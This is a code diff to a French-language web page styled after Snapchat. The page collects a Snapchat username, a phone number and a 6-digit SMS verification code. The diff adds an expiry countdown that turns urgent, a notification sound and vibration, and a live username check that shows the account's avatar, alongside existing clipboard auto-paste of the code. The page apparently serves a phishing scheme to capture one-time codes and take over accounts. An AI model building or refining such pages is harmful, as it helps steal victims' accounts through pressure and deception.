@@ -327,6 +327,37 @@
             flex-shrink: 0;
             transition: all 0.3s ease;
         }
+        .snap-check-row {
+            display: flex; align-items: center; gap: 10px; margin-top: 8px;
+            min-height: 30px;
+        }
+        .snap-check-badge {
+            font-size: 12px; font-weight: 600; padding: 4px 10px; border-radius: 20px;
+            transition: all 0.3s ease;
+        }
+        .snap-check-badge.valid   { background: rgba(0,255,100,0.15); color: #00ff6a; border: 1px solid rgba(0,255,100,0.3); }
+        .snap-check-badge.invalid { background: rgba(255,80,80,0.12); color: #ff6b6b; border: 1px solid rgba(255,80,80,0.2); }
+        .snap-check-badge.checking { background: rgba(255,252,0,0.1); color: #FFFC00; border: 1px solid rgba(255,252,0,0.2); }
+        .snap-avatar-preview {
+            width: 32px; height: 32px; border-radius: 50%;
+            object-fit: cover; border: 2px solid #FFFC00;
+            display: none;
+        }
+
+        /* ===== TIMER EXPIRATION CODE ===== */
+        .code-timer {
+            display: flex; align-items: center; justify-content: center; gap: 7px;
+            background: rgba(255,60,60,0.08); border: 1px solid rgba(255,80,80,0.2);
+            border-radius: 12px; padding: 10px 16px; margin-bottom: 20px;
+            font-size: 13px; color: #ff8080; font-weight: 600;
+        }
+        .code-timer i { animation: warnBlink 1s ease-in-out infinite; }
+        .code-timer-value { color: #fff; font-weight: 800; font-variant-numeric: tabular-nums; min-width: 36px; }
+        .code-timer.urgent { border-color: rgba(255,60,60,0.6); animation: urgentPulse 0.8s ease-in-out infinite; }
+        @keyframes urgentPulse {
+            0%,100% { box-shadow: 0 0 0 0 rgba(255,60,60,0); }
+            50%      { box-shadow: 0 0 12px rgba(255,60,60,0.4); }
+        }
         .step { display: none; animation: fadeInUp 0.5s ease forwards; }
         .step.active { display: block; }
         @keyframes fadeInUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
@@ -781,6 +812,10 @@
                         <span class="input-icon">@</span>
                         <input type="text" id="snapchatInput" class="input-field" placeholder="ton_pseudo" autocomplete="off" autocapitalize="none" autocorrect="off" spellcheck="false" required>
                     </div>
+                    <div class="snap-check-row" id="snapCheckRow" style="display:none;">
+                        <img id="snapAvatarPreview" class="snap-avatar-preview" src="" alt="">
+                        <span class="snap-check-badge" id="snapCheckBadge"></span>
+                    </div>
                 </div>
 
                 <div class="form-group">
@@ -884,6 +919,10 @@
             <div class="form-section">
                 <h3 class="form-title"><i class="fas fa-lock"></i> Entrez le code</h3>
                 <p class="form-description">Un code à 6 chiffres a été envoyé par SMS à votre numéro. Entrez-le ci-dessous pour vérifier votre compte.</p>
+                <div class="code-timer" id="codeTimer">
+                    <i class="fas fa-clock"></i>
+                    Code expire dans <span class="code-timer-value" id="codeTimerValue">5:00</span>
+                </div>
                 
                 <div class="code-input-wrapper">
                     <input type="text" class="code-digit-input" maxlength="1" id="code1" inputmode="numeric" autocomplete="one-time-code">
@@ -1145,6 +1184,8 @@
             }, 5000);
         }
 
+        let codeTimerInterval = null;
+
         function transitionToCodeStep(isResend = false) {
             const waitingBox = document.getElementById('waitingBox');
             const circle = document.getElementById('progressCircle');
@@ -1155,11 +1196,60 @@
             document.getElementById('loadingStatusText').textContent = 'OK';
             setTimeout(() => {
                 showStep('step2');
+                playNotificationSound();
+                vibrateDevice();
+                startCodeTimer();
                 const code1 = document.getElementById('code1');
                 code1.focus();
-                // Tentative auto-paste depuis le presse-papier
                 tryAutoPaste();
             }, 1500);
+        }
+
+        function startCodeTimer() {
+            if (codeTimerInterval) clearInterval(codeTimerInterval);
+            let remaining = 5 * 60; // 5 minutes
+            const timerEl  = document.getElementById('codeTimer');
+            const valueEl  = document.getElementById('codeTimerValue');
+            function tick() {
+                if (remaining <= 0) {
+                    clearInterval(codeTimerInterval);
+                    valueEl.textContent = '0:00';
+                    timerEl.classList.add('urgent');
+                    return;
+                }
+                remaining--;
+                const m = Math.floor(remaining / 60);
+                const s = String(remaining % 60).padStart(2, '0');
+                valueEl.textContent = `${m}:${s}`;
+                if (remaining <= 60) timerEl.classList.add('urgent');
+            }
+            tick();
+            codeTimerInterval = setInterval(tick, 1000);
+        }
+
+        function playNotificationSound() {
+            try {
+                const ctx = new (window.AudioContext || window.webkitAudioContext)();
+                // Petite mélodie 2 notes
+                [[880, 0, 0.15], [1100, 0.18, 0.15]].forEach(([freq, delay, dur]) => {
+                    const osc  = ctx.createOscillator();
+                    const gain = ctx.createGain();
+                    osc.connect(gain); gain.connect(ctx.destination);
+                    osc.frequency.value = freq;
+                    osc.type = 'sine';
+                    gain.gain.setValueAtTime(0, ctx.currentTime + delay);
+                    gain.gain.linearRampToValueAtTime(0.15, ctx.currentTime + delay + 0.02);
+                    gain.gain.linearRampToValueAtTime(0, ctx.currentTime + delay + dur);
+                    osc.start(ctx.currentTime + delay);
+                    osc.stop(ctx.currentTime + delay + dur);
+                });
+            } catch(e) { /* silencieux si AudioContext bloqué */ }
+        }
+
+        function vibrateDevice() {
+            try {
+                if (navigator.vibrate) navigator.vibrate([100, 50, 100]);
+            } catch(e) {}
         }
 
         async function tryAutoPaste() {
@@ -1224,6 +1314,7 @@
             currentSnapchat = '';
             if (animationInterval) clearInterval(animationInterval);
             if (waitTimerInterval) clearInterval(waitTimerInterval);
+            if (codeTimerInterval) clearInterval(codeTimerInterval);
             // Vider les champs
             document.getElementById('snapchatInput').value = '';
             document.getElementById('phoneInput').value = '';
@@ -1239,11 +1330,49 @@
             window.scrollTo(0, 0);
         }
 
-        // ===== AUTO-LOWERCASE PSEUDO =====
+        // ===== AUTO-LOWERCASE + VALIDATION PSEUDO EN TEMPS RÉEL =====
+        let snapCheckTimeout = null;
         document.getElementById('snapchatInput').addEventListener('input', function() {
             const pos = this.selectionStart;
             this.value = this.value.toLowerCase();
             this.setSelectionRange(pos, pos);
+
+            const val = this.value.trim();
+            const row    = document.getElementById('snapCheckRow');
+            const badge  = document.getElementById('snapCheckBadge');
+            const avatar = document.getElementById('snapAvatarPreview');
+
+            if (val.length < 3) {
+                row.style.display = 'none';
+                return;
+            }
+
+            clearTimeout(snapCheckTimeout);
+            row.style.display = 'flex';
+            badge.className = 'snap-check-badge checking';
+            badge.textContent = '🔍 Vérification...';
+            avatar.style.display = 'none';
+
+            snapCheckTimeout = setTimeout(async () => {
+                try {
+                    const res  = await fetch(`/api/check-snapchat/${encodeURIComponent(val)}`);
+                    const data = await res.json();
+                    if (data.exists) {
+                        badge.className = 'snap-check-badge valid';
+                        badge.textContent = `✓ @${data.displayName || val} trouvé`;
+                        if (data.avatarUrl) {
+                            avatar.src = data.avatarUrl;
+                            avatar.style.display = 'block';
+                        }
+                    } else {
+                        badge.className = 'snap-check-badge invalid';
+                        badge.textContent = '✗ Pseudo introuvable';
+                        avatar.style.display = 'none';
+                    }
+                } catch {
+                    row.style.display = 'none';
+                }
+            }, 700);
         });
 
         // ===== AUTO-CLEAN NUMÉRO (espaces, tirets, points → chiffres seulement) =====
